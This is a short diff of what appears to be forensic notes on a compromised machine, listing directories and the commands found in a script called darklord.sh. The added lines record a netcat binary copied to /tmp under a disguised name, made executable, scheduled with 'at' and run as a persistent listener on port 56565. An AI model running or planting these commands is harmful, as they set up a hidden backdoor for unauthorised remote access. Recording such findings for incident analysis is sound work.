@@ -12,7 +12,11 @@ darklord.txt    empty
 
 # Callout domain
 check the screenshot on section 1 to see the commands used to access these directories
-/tmp/
+/tmp/remotesec -k -l 56565
 /etc/
-/bin/ 
- 
+these are the commands found on the darklord.sh: 
+     cp /bin/nc /tmp/remotesec 
+     #!/bin/bash
+     chmod +x remotesec 
+     at -f remotesec now &
+
